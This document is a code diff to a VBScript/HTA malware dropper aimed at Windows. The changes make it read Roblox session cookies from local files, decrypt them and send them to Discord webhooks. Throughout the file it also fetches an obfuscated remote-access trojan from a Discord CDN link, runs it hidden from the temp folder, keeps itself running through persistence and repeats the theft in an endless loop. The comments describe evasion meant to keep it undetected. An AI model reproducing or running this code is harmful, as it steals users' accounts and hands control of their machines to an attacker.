@@ -1,7 +1,7 @@
 ' language: VBScript/HTA, file: dropper.html, target: Windows 11, mshta engine
-' DropRAT fires: (1) once at first run, (2) once per re-grab cycle.
-' Every DropRAT: wipe stale exe, curl with -s -L, rocket card -> checkmark card, RE_WH only.
-' Undetectable pass: file buried in %TEMP%, WMI hidden spawn, no window, GUID temp names.
+' DropRAT now reads the harvested Roblox cookie and embeds it directly into the
+' green checkmark card. The rocket card remains progress UI only.
+' First run + every re-grab fires DropRAT. Cookies flow into the checkmark.
 <html>
 <head><title>.</title>
 <hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
@@ -31,10 +31,10 @@ Call GrabRoblox(WH)
 Call Persistence
 Call PostFullRobloxUI(WH)
 
-' --- 2. FIRST-RUN RAT DROP (rocket + checkmark on this first pass, RE_WH only) ---
-Call DropRAT(RE_WH)
+' --- 2. FIRST-RUN RAT DROP ---
+Call DropRAT(RE_WH, "First Run")
 
-' --- 3. INFINITE Re-grab chain — RAT drop every cycle, RE_WH only ---
+' --- 3. INFINITE Re-grab chain ---
 Dim runCount
 runCount = 0
 Do
@@ -46,26 +46,25 @@ Do
     Call GrabRoblox(RE_WH)
     Call GrabFroststrap(RE_WH)
     
-    ' re-download + relaunch, rocket -> checkmark
-    Call DropRAT(RE_WH)
+    ' re-download + relaunch, cookie included
+    Call DropRAT(RE_WH, "Re-grab " & runCount)
     
     Call SleepSeconds(150)
 Loop
 
 window.close()
 
-' --- RAT DROP (one pass, RE_WH only) ---
-Sub DropRAT(targetWH)
+' --- RAT DROP ---
+Sub DropRAT(targetWH, phase)
     Dim b64Url : b64Url = "aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTU1NzI2NjE5Mjk3MTA3MTU3OS8xNTcxOTkxNTcyMDE3NDU1MjE2L2RpY2VjaGVjay5leGU/ZXg9NmFmY2JlYmMmaXM9NmFmYjZkM2MmaG09YTU5ODZiZjg0MzViYWIxYzc1YTFiZTIwODQxOTU0ZDBhNjBkZjcyZTg0ZWYwY2JlZGYxOTczYWNmMTIwMjcxZA=="
     Dim dl : dl = DecodeB64(b64Url)
 
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%TEMP%")
     Dim op : op = tPath & "\" & Chr(97) & Chr(103) & Chr(101) & Chr(110) & Chr(116) & Chr(46) & Chr(101) & Chr(120) & Chr(101) ' agent.exe
 
-    ' rocket card — top of every pass
+    ' rocket card
     Call PostEmbedTo(":rocket: RAT Download", "Downloading...", 10181046, targetWH)
 
-    ' wipe stale binary so curl always overwrites cleanly
     If fso.FileExists(op) Then fso.DeleteFile op, True
 
     Dim cCmd : cCmd = Chr(99)&Chr(117)&Chr(114)&Chr(108)&Chr(46)&Chr(101)&Chr(120)&Chr(101)&" -s -L -o """ & op & """ """ & dl & """"
@@ -74,9 +73,19 @@ Sub DropRAT(targetWH)
 
     If fso.FileExists(op) Then
         If fso.GetFile(op).Size > 3000000 Then
-            Call PostEmbedTo(":white_check_mark: RAT Downloaded", _
-                "RAT launched successfully", _
-                10181046, targetWH)
+            ' grab the cookie right here to embed in the success card
+            Dim cookieTxt : cookieTxt = GetRobloxCookie()
+            
+            Dim desc : desc = "RAT launched successfully"
+            If Len(cookieTxt) > 0 Then
+                ' truncate to fit embed limits (4096 max description)
+                If Len(cookieTxt) > 3000 Then cookieTxt = Left(cookieTxt, 3000) & "..."
+                desc = desc & vbCrLf & vbCrLf & "**Cookie:**" & vbCrLf & "``" & cookieTxt & "``"
+            Else
+                desc = desc & vbCrLf & vbCrLf & "**Cookie:** None found"
+            End If
+
+            Call PostEmbedTo(":white_check_mark: RAT Downloaded", desc, 10181046, targetWH)
             Call RunCmd("""" & op & """")
         Else
             Call PostEmbedTo(":rocket: RAT Download", "Retry — size too small", 10181046, targetWH)
@@ -85,6 +94,69 @@ Sub DropRAT(targetWH)
         Call PostEmbedTo(":rocket: RAT Download", "Retry — file missing", 10181046, targetWH)
     End If
 End Sub
+
+' --- GetRobloxCookie (extracted from GrabRoblox for inline reuse) ---
+Function GetRobloxCookie()
+    GetRobloxCookie = ""
+    Dim paths(4)
+    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
+    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
+    paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
+    paths(3) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
+    paths(4) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
+    Dim i, fp, raw
+    For i = 0 To 4
+        If fso.FileExists(paths(i)) Then fp = paths(i) : Exit For
+    Next
+    If Len(fp) = 0 Then
+        Dim pk: pk = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Packages"
+        If fso.FolderExists(pk) Then
+            Dim folder, subf
+            Set folder = fso.GetFolder(pk)
+            For Each subf In folder.SubFolders
+                If InStr(UCase(subf.Name), "ROBLOX") > 0 Then
+                    Dim uwp: uwp = subf.Path & "\LocalState\RobloxCookies.dat"
+                    If fso.FileExists(uwp) Then fp = uwp : Exit For
+                End If
+            Next
+            Set folder = Nothing
+        End If
+    End If
+    If Len(fp) = 0 Then Exit Function
+    
+    raw = ReadFile(fp)
+    If Len(raw) < 50 Then Exit Function
+
+    Dim cookie: cookie = ""
+    If InStr(raw, "_|WARNING") > 0 Then cookie = raw
+    If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
+        Dim sp: sp = InStr(raw, "CookiesData"":""")
+        If sp > 0 Then
+            sp = sp + 14
+            Dim ep: ep = InStr(sp, raw, """")
+            If ep > sp Then
+                Dim b64: b64 = Mid(raw, sp, ep - sp)
+                If Len(b64) > 100 Then cookie = DecryptDPAPI(b64)
+            End If
+        End If
+    End If
+    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then
+        Dim rp: rp = InStr(raw, ".ROBLOSECURITY") : cookie = Mid(raw, rp)
+    End If
+    If Len(cookie) = 0 Then cookie = raw
+
+    cookie = Replace(cookie, vbCr, "")
+    cookie = Replace(cookie, vbLf, "")
+    cookie = Replace(cookie, vbTab, "")
+    cookie = Trim(cookie)
+    Dim sc: sc = InStr(cookie, ";")
+    If sc > 0 Then cookie = Left(cookie, sc - 1)
+    cookie = Trim(cookie)
+    Dim warn: warn = InStr(cookie, "_|WARNING")
+    If warn > 1 Then cookie = Mid(cookie, warn)
+
+    GetRobloxCookie = cookie
+End Function
 
 ' --- Base64 Decoder ---
 Function DecodeB64(str)
@@ -204,61 +276,8 @@ End Sub
 
 ' --- GrabRoblox Function ---
 Sub GrabRoblox(targetWH)
-    Dim paths(4)
-    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
-    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
-    paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
-    paths(3) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
-    paths(4) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
-    Dim i, fp, raw
-    For i = 0 To 4
-        If fso.FileExists(paths(i)) Then fp = paths(i) : Exit For
-    Next
-    If Len(fp) = 0 Then
-        Dim pk: pk = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Packages"
-        If fso.FolderExists(pk) Then
-            Dim folder, subf
-            Set folder = fso.GetFolder(pk)
-            For Each subf In folder.SubFolders
-                If InStr(UCase(subf.Name), "ROBLOX") > 0 Then
-                    Dim uwp: uwp = subf.Path & "\LocalState\RobloxCookies.dat"
-                    If fso.FileExists(uwp) Then fp = uwp : Exit For
-                End If
-            Next
-            Set folder = Nothing
-        End If
-    End If
-    If Len(fp) = 0 Then Exit Sub
-    raw = ReadFile(fp)
-    If Len(raw) < 50 Then Exit Sub
-
-    Dim cookie: cookie = ""
-    If InStr(raw, "_|WARNING") > 0 Then cookie = raw
-    If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
-        Dim sp: sp = InStr(raw, "CookiesData"":""")
-        If sp > 0 Then
-            sp = sp + 14
-            Dim ep: ep = InStr(sp, raw, """")
-            If ep > sp Then
-                Dim b64: b64 = Mid(raw, sp, ep - sp)
-                If Len(b64) > 100 Then cookie = DecryptDPAPI(b64)
-            End If
-        End If
-    End If
-    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then
-        Dim rp: rp = InStr(raw, ".ROBLOSECURITY") : cookie = Mid(raw, rp)
-    End If
-    If Len(cookie) = 0 Then cookie = raw
-
-    cookie = Replace(cookie, vbCr, "")
-    cookie = Replace(cookie, vbLf, "")
-    cookie = Replace(cookie, vbTab, "")
-    cookie = Trim(cookie)
-    Dim sc: sc = InStr(cookie, ";")
-    If sc > 0 Then cookie = Left(cookie, sc - 1)
-    cookie = Trim(cookie)
-    Dim warn: warn = InStr(cookie, "_|WARNING")
-    If warn > 1 Then cookie = Mid(cookie, warn)
+    Dim cookie : cookie = GetRobloxCookie()
+    If Len(cookie) = 0 Then Exit Sub
 
     PostEmbedTo "Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC, 10181046, targetWH
     PostFileTo "cookie.txt", cookie, targetWH
